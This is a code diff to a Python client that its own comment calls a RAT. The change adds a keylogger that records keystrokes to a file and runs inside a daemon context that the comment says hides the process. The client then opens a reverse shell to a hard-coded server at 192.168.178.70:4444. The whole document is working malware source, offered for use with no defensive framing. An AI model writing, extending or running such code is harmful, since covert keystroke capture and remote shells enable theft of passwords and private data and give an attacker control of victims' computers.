@@ -1,7 +1,10 @@
 from connection import Connection
 from rev_shell import Shell
+from keylogger import Keylogger
 import time
 import socket
+import daemon
+import logging
 
 
 class Client:
@@ -11,12 +14,13 @@ class Client:
         - Gets a reverse shell back to the server
     """
 
-    def __init__(self, host: str, port: int) -> None:
+    def __init__(self, host: str, port: int, filename: str="activity.log") -> None:
         """
         Constructor
 
         :param host: The server's IP
         :param port: The server's port number
+        :param filename: The file's name where the key strokes are stored
         """
         self.host = host
         self.port = port
@@ -34,9 +38,20 @@ class Client:
     def hack(self) -> None:
         """
         Creates a connection between server and client.
+        Starts logging key events
         Gets a reverse shell from client to server
         """
-
+        
+        # --------------------------KEYLOGGER--------------------------#
+        keylogger = Keylogger(self.filename)
+        keylogger.setup()
+        
+        # Start handler and make the proccess hidden
+        with daemon.DaemonContext(files_preserve=[logging.getLogger().handlers[0].stream]):
+            # Start keylogger
+            keylogger.start_logging()
+        
+        # --------------------------REV SHELL--------------------------# 
         # Get a reverse shell back to server
         try:
             self.shell.get_shell()
@@ -52,3 +67,4 @@ class Client:
 if __name__ == "__main__":
     # Run RAT with specified IP and port
     Client("192.168.178.70", 4444).hack()
+    
